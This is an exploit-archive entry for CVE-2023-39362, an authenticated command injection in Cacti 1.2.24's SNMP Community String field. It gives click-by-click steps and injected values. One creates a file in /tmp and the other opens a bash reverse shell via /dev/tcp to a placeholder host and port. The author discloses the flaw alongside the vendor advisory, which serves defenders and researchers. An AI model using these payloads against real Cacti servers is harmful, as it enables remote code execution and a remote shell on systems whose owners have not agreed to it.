@@ -1,0 +1,72 @@
+id: 39107
+date: 10/09/2023
+title: Cacti 1.2.24 - Authenticated command injection when using SNMP options Vulnerability
+author: Antonio Francesco Sardella
+cves: CVE-2023-39362
+
+# Exploit Title: Cacti 1.2.24 - Authenticated command injection when using SNMP options
+# Exploit Author: Antonio Francesco Sardella
+# Vendor Homepage: https://www.cacti.net/
+# Software Link: https://www.cacti.net/info/downloads
+# Version: Cacti 1.2.24
+# Tested on: Cacti 1.2.24 installed on 'php:7.4.33-apache' Docker container
+# CVE: CVE-2023-39362
+# Category: WebApps
+# Original Security Advisory: https://github.com/Cacti/cacti/security/advisories/GHSA-g6ff-58cj-x3cp
+# Example Vulnerable Application: https://github.com/m3ssap0/cacti-rce-snmp-options-vulnerable-application
+# Vulnerability discovered and reported by: Antonio Francesco Sardella
+
+=======================================================================================
+Cacti 1.2.24 - Authenticated command injection when using SNMP options (CVE-2023-39362)
+=======================================================================================
+
+-----------------
+Executive Summary
+-----------------
+
+In Cacti 1.2.24, under certain conditions, an authenticated privileged user, can use a malicious string in the SNMP options of a Device, performing command injection and obtaining remote code execution on the underlying server.
+
+-------
+Exploit
+-------
+
+Prerequisites:
+    - The attacker is authenticated.
+    - The privileges of the attacker allow to manage Devices and/or Graphs, e.g., "Sites/Devices/Data", "Graphs".
+    - A Device that supports SNMP can be used.
+    - Net-SNMP Graphs can be used.
+    - snmp module of PHP is not installed.
+
+Example of an exploit:
+    - Go to "Console" > "Create" > "New Device".
+    - Create a Device that supports SNMP version 1 or 2.
+    - Ensure that the Device has Graphs with one or more templates of:
+        - "Net-SNMP - Combined SCSI Disk Bytes"
+        - "Net-SNMP - Combined SCSI Disk I/O"
+        - (Creating the Device from the template "Net-SNMP Device" will satisfy the Graphs prerequisite)
+    - In the "SNMP Options", for the "SNMP Community String" field, use a value like this:
+        public\' ; touch /tmp/m3ssap0 ; \'
+    - Click the "Create" button.
+    - Check under /tmp the presence of the created file.
+
+To obtain a reverse shell, a payload like the following can be used.
+
+    public\' ; bash -c "exec bash -i &>/dev/tcp/<host>/<port> <&1" ; \'
+
+A similar exploit can be used editing an existing Device, with the same prerequisites, and waiting for the poller to run. It could be necessary to change the content of the "Downed Device Detection" field under the "Availability/Reachability Options" section with an item that doesn't involve SNMP (because the malicious payload could break the interaction with the host).
+
+----------
+Root Cause
+----------
+
+A detailed root cause of the vulnerability is available in the original security advisory (https://github.com/Cacti/cacti/security/advisories/GHSA-g6ff-58cj-x3cp) or in my blog post (https://m3ssap0.github.io/articles/cacti_authenticated_command_injection_snmp.html).
+
+----------
+References
+----------
+
+    - https://github.com/Cacti/cacti/security/advisories/GHSA-g6ff-58cj-x3cp
+    - https://m3ssap0.github.io/articles/cacti_authenticated_command_injection_snmp.html
+    - https://github.com/m3ssap0/cacti-rce-snmp-options-vulnerable-application
+
+#  0day.today [2023-10-12]  #
